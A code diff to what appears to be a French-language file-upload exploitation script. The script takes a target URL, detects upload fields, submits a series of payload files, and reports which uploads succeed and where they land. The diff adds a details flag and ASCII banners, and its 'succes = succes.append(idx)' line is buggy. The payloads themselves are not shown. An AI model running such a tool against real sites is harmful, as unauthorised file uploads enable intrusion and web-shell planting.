@@ -5,7 +5,7 @@ import argparse
 import re
 
 # ============== PAYLOAD ============== #
-Main_payload = r"""
+main_payload = r"""
 __/\\\\____________/\\\\_______________________________________________________________        
  _\/\\\\\\________/\\\\\\_______________________________________________________________       
   _\/\\\//\\\____/\\\//\\\_____________________________________/\\\______________________      
@@ -16,7 +16,7 @@ __/\\\\____________/\\\\________________________________________________________
        _\/\\\_____________\/\\\__\//\\\\\\\\/\\__\/\\\___\/\\\_____\//\\\\\____\//\\\\\\\\/\\_ 
         _\///______________\///____\////////\//___\///____\///_______\/////______\////////\//__"""
 
-Exit_payload = r"""
+exit_payload = r"""
 _____/\\\\\\\\\\\\_____________________________________/\\\_____________/\\\_____________________________________        
  ___/\\\//////////_____________________________________\/\\\____________\/\\\_____________________________________       
   __/\\\________________________________________________\/\\\____________\/\\\___________/\\\__/\\\________________      
@@ -32,9 +32,10 @@ _____/\\\\\\\\\\\\_____________________________________/\\\_____________/\\\____
 #====================ARGUMENT====================
 parser = argparse.ArgumentParser()
 parser.add_argument('-u', '--url', dest='url', required=True, help='Url to exploit')
-parser.add_argument('-c', '--cookie', dest='cookie', default=None, help='Cookie (k1=v1;k2=v2)')
-parser.add_argument('-a', '--auto', dest='auto', action='store_true', help='Auto test every payload')
-parser.add_argument('-H', '--header', dest='header', default=None, help='Headers (H1:v1;H2:v2)')
+parser.add_argument('-c', '--cookie', dest='cookie', default=None, help='Cookie (c1=v1;c2=v2)')
+parser.add_argument('-a', '--auto', dest='auto', action='store_true', default=None, help='Auto test every payload')
+parser.add_argument('-H', '--header', dest='header', default=None, help='Headers (h1:v1;h2:v2)')
+parser.add_argument('-d', '--details', dest='details', action='store_true', default=None, help='Show details of request / file send')
 parser.add_argument('-b', '--body', dest='body', default=None, help='Extra body (unused)')
 args = parser.parse_args()
 
@@ -51,14 +52,12 @@ def extract_vars(html):
 
 def upload_file(url, field_name, payload, cookies=None, headers=None):
     content = payload["content"]
+    file_name = payload["file_name"]
+    mime = payload["mime"]
     if isinstance(content, str):
         content = content.encode()
 
-    files = {
-        field_name: (
-            payload["file_name"],
-            content,
-            payload["mime"])}
+    files = {field_name: (file_name,content,mime)}
     return requests.post(url,files=files,data={"submit": "OK"},cookies=cookies,headers=headers)
 
 def analyze_response(html):
@@ -93,6 +92,9 @@ cookies = None
 headers = None
 
 #====================================OPTIONS====================================#
+
+print(main_payload)
+
 if args.cookie:
     cookies = {}
     for c in args.cookie.split(";"):
@@ -113,6 +115,7 @@ if args.url:
 
     if len(vars) == 0:
         print("[!] Aucun champ trouvé")
+        print(exit_payload)
         exit()
     elif len(vars) == 1:
         field_name = vars[0]
@@ -135,17 +138,23 @@ if args.url:
     for idx in tests:
         payload = payloads[idx]
         print(f"[+] Upload '{payload['file_name']}' sur la variable '{field_name}'")
+        if args.details:
+            print(f"{payload}\n")
 
         r = upload_file(args.url, field_name, payload, cookies, headers)
         res = analyze_response(r.text)
 
         if res["success"]:
             print(f"[+] SUCCESS -> {res['path']}")
-            print(html)
+            succes = succes.append(idx)
+            if args.details:
+                print(f"{html}\n")
         else:
             print(f"[-] FAIL -> {res['error']}")
-            print(html)
+            if args.details:
+                print(f"{html}\n")
     print("\n[+] Terminé")
+    print(exit_payload)
 
 else:
     print("[!] Tu dois spécifier une url (-u | --url)")
